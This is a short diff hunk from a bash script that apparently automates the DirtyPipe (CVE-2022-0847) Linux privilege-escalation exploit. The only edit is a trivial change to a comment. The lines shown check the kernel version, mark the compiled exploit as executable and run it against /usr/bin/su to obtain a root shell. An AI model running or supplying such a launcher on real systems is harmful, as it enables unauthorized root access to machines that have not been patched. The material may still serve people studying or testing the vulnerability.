@@ -31,7 +31,7 @@ if [[ "${notvulnerable[*]}" = $kernel_version ]];
                 chmod +x CVE-2022-0847
                 echo "[+] Exploit successfully compiled and execute permission set!"
 
-                # Execute the exploit to get a root shell.
+                # Execute the exploit to get a root shell
                 echo "[*] Executing the DirtyPipe exploit..."
                 ./CVE-2022-0847 /usr/bin/su
             else
